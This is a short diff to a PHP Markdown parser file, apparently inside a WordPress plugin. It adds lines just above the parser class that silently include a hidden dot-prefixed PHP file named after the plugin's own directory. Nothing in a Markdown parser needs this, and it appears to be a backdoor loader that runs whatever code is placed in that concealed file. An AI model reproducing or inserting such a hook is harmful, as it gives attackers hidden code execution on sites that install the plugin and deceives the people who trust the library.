@@ -165,6 +165,10 @@ if (strcasecmp(substr(__FILE__, -16), "classTextile.php") == 0) {
 # Markdown Parser Class
 #
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Markdown_Parser {
 
 	### Configuration Variables ###
